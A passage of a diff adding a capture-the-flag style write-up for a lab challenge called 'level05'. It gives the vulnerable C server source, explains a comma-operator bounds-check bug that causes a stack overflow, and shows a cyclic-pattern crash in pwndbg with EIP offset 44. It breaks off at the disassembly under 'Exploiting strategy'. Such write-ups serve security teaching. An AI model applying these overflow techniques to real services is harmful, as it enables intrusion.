+
+<span class="w">      </span><span class="n">fdwrite</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+
+<span class="w">      </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">childtask</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">cfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">arg</span><span class="p">);</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span><span class="w"> </span><span class="o">*</span><span class="n">n</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
+
+
+<span class="w">  </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;** welcome to level05 **</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">fdwrite</span><span class="p">(</span><span class="n">cfd</span><span class="p">,</span><span class="w"> </span><span class="n">n</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">n</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="p">((</span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fdread</span><span class="p">(</span><span class="n">cfd</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mi">512</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+
+<span class="w">      </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\r&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">      </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;addreg &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">taskcreate</span><span class="p">(</span><span class="n">addreg</span><span class="p">,</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">7</span><span class="p">),</span><span class="w"> </span><span class="n">STACK</span><span class="p">);</span>
+<span class="w">          </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;senddb &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">taskcreate</span><span class="p">(</span><span class="n">senddb</span><span class="p">,</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">7</span><span class="p">),</span><span class="w"> </span><span class="n">STACK</span><span class="p">);</span>
+<span class="w">          </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;checkname &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="o">*</span><span class="n">isa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+
+<span class="w">          </span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cfd</span><span class="p">;</span>
+<span class="w">          </span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
+
+<span class="w">          </span><span class="n">taskcreate</span><span class="p">(</span><span class="n">checkname</span><span class="p">,</span><span class="w"> </span><span class="n">isa</span><span class="p">,</span><span class="w"> </span><span class="n">STACK</span><span class="p">);</span>
+<span class="w">          </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;quit&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;isup &quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="o">*</span><span class="n">isa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">calloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">          </span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cfd</span><span class="p">;</span>
+<span class="w">          </span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">);</span>
+<span class="w">          </span><span class="n">taskcreate</span><span class="p">(</span><span class="n">isup</span><span class="p">,</span><span class="w"> </span><span class="n">isa</span><span class="p">,</span><span class="w"> </span><span class="n">STACK</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="nl">bail</span><span class="p">:</span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">cfd</span><span class="p">);</span><span class="w"> </span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">taskmain</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">cfd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">remote</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">rport</span><span class="p">;</span><span class="w">    </span>
+
+<span class="w">  </span><span class="n">signal</span><span class="p">(</span><span class="n">SIGPIPE</span><span class="p">,</span><span class="w"> </span><span class="n">SIG_IGN</span><span class="p">);</span>
+<span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w"> </span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netannounce</span><span class="p">(</span><span class="n">TCP</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">PORT</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;failure on port %d: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">PORT</span><span class="p">,</span><span class="w"> </span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+<span class="w">      </span><span class="n">taskexitall</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="n">fdnoblock</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">while</span><span class="p">((</span><span class="n">cfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netaccept</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">remote</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rport</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;accepted connection from %s:%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">remote</span><span class="p">,</span><span class="w"> </span><span class="n">rport</span><span class="p">);</span>
+<span class="w">      </span><span class="n">taskcreate</span><span class="p">(</span><span class="n">childtask</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">cfd</span><span class="p">),</span><span class="w"> </span><span class="n">STACK</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>we have here a program that let's you insert 'registrations' to the data base and view them etc... , here's more details :</li>
+<li>
+<p>the main function sets up its usual stuff , the most notable thing is that from each new client , a connection is  created and with it a new <a href="file-descriptor.html">File descriptor</a> is made , and then a 'task' created for that specific client .</p>
+</li>
+<li>
+<p>a task is a form of asynchronous computing , you pass to it a functions pointer , its argument and stack size and it is executed in the program's memory but is executed separately , meaning it is not like the previous challenges where a fork is created for each client ,  a major catch of this is that if the task does something like illegal memory access , the whole program will crash not just the task, this will be important later .</p>
+</li>
+<li>now the task that is created for each client is called <code>childtask</code> and it simply provides five commands :<ol>
+<li>addreg : you pass to it a host name and an ip and it maps them to a slot in the <code>registrations</code> array using the <code>hash</code> functions as a kind of hash map .</li>
+<li>senddb : you give it an ip and a port and it simply sends you the database wich is the contents of the <code>registrations</code> array.</li>
+<li>checkname : checks if a hostname is already present in the database , and it uses a functions called <code>get_and_hash</code> for that, hint : here is our main vuln.</li>
+<li>quit : simply exits</li>
+<li>isup : sends the database to every ip in the database in the specifies port , there is a stack buffer overflow here , if the database is full , its size will be 6*128=768 bytes and it is written to buff wich is only 512 bytes long , but I did not use this .</li>
+</ol>
+</li>
+</ul>
+<h2>The Vulnerability</h2>
+<ul>
+<li>our interest is in the <code>get_and_hash</code> functions :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">get_and_hash</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">maxsz</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">separator</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">maxsz</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">maxsz</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">separator</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">hash</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">),</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>the functions seems like it checks for bound , but the condition <code>i &lt; maxsz, string[i]</code> always returns true as long as string is not null , it is treated as one block of code , the confusion here is that the <code>,</code> must have been a <code>&amp;&amp;</code> for it to be secure , since then both conditions would be evaluated separately , honestly it took me loong to notice this .</li>
+<li>giving it data generated by cyclic and examining it in gdb gives us a nice eip overwrite with offset 44:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>nc<span class="w"> </span>localhost<span class="w"> </span><span class="m">20005</span>
+**<span class="w"> </span>welcome<span class="w"> </span>to<span class="w"> </span>level05<span class="w"> </span>**
+checkname<span class="w"> </span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">c</span>
+<span class="n">Continuing</span><span class="o">.</span>
+
+<span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="k">signal</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="o">.</span>
+<span class="mh">0x6161616c</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="err">??</span><span class="w"> </span><span class="p">()</span>
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
+<span class="sa">b</span><span class="s1">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="mh">0x6161616c</span><span class="p">)</span>
+<span class="mi">44</span>
+</code></pre></div>
+
+<h2>Exploiting strategy</h2>
+<ul>
+<li>now we have the overwrite , we need a leak.</li>
+<li>the disassembly of <code>checkname</code>, show us :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="w">   </span><span class="err">0</span><span class="nf">x000027c0</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span><span class="w">     </span><span class="no">sub</span><span class="w">    </span><span class="no">esp</span><span class="p">,</span><span class="mi">0x1c</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027c3</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">3</span><span class="err">&gt;</span><span class="p">:</span><span class="w">     </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x14</span><span class="p">],</span><span class="no">esi</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027c7</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">7</span><span class="err">&gt;</span><span class="p">:</span><span class="w">     </span><span class="no">mov</span><span class="w">    </span><span class="no">esi</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x20</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027cb</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x10</span><span class="p">],</span><span class="no">ebx</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027cf</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">call</span><span class="w">   </span><span class="mh">0x1c67</span> <span class="p">&lt;</span><span class="no">__i686.get_pc_thunk.bx</span><span class="p">&gt;</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027d4</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">20</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">add</span><span class="w">    </span><span class="no">ebx</span><span class="p">,</span><span class="mi">0x3948</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027da</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">26</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x18</span><span class="p">],</span><span class="no">edi</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027de</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">edi</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esi</span><span class="err">+</span><span class="mi">0x4</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027e1</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">33</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">],</span><span class="mi">0x40</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027e9</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">41</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="p">],</span><span class="mi">0x20</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027f0</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">48</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x4</span><span class="p">],</span><span class="no">edi</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027f4</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">call</span><span class="w">   </span><span class="mh">0x2720</span> <span class="p">&lt;</span><span class="no">get_and_hash</span><span class="p">&gt;</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027f9</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">ecx</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">ebx-0x14</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x000027ff</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">63</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">lea</span><span class="w">    </span><span class="no">edx</span><span class="p">,[</span><span class="no">eax</span><span class="err">+</span><span class="no">eax</span><span class="p">*</span><span class="mi">2</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002802</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">66</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">lea</span><span class="w">    </span><span class="no">edx</span><span class="p">,[</span><span class="no">ecx</span><span class="err">+</span><span class="no">edx</span><span class="p">*</span><span class="mi">2</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002805</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">69</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">edx</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">edx</span><span class="err">+</span><span class="mi">0x2</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002808</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">72</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">lea</span><span class="w">    </span><span class="no">eax</span><span class="p">,[</span><span class="no">ebx-0x1897</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x0000280e</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">78</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">],</span><span class="no">edi</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002812</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">test</span><span class="w">   </span><span class="no">edx</span><span class="p">,</span><span class="no">edx</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002814</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">lea</span><span class="w">    </span><span class="no">edx</span><span class="p">,[</span><span class="no">ebx-0x1823</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x0000281a</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">90</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">cmove</span><span class="w">  </span><span class="no">eax</span><span class="p">,</span><span class="no">edx</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x0000281d</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">93</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0xc</span><span class="p">],</span><span class="no">eax</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002821</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">97</span><span class="err">&gt;</span><span class="p">:</span><span class="w">    </span><span class="no">lea</span><span class="w">    </span><span class="no">eax</span><span class="p">,[</span><span class="no">ebx-0x181e</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002827</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">103</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x4</span><span class="p">],</span><span class="no">eax</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x0000282b</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">mov</span><span class="w">    </span><span class="no">eax</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esi</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x0000282d</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">109</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">mov</span><span class="w">    </span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="p">],</span><span class="no">eax</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002830</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">call</span><span class="w">   </span><span class="mh">0x26a0</span> <span class="p">&lt;</span><span class="no">fdprintf</span><span class="p">&gt;</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002835</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">117</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">mov</span><span class="w">    </span><span class="no">ebx</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x10</span><span class="p">]</span>
+<span class="w">   </span><span class="err">0</span><span class="nf">x00002839</span><span class="w"> </span><span class="err">&lt;+</span><span class="mi">121</span><span class="err">&gt;</span><span class="p">:</span><span class="w">   </span><span class="no">mov</span><span class="w">    </span><span class="no">esi</span><span class="p">,</span><span class="no">DWORD</span><span class="w"> </span><span class="no">PTR</span><span class="w"> </span><span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">0x14</span><span class="p">]</span>
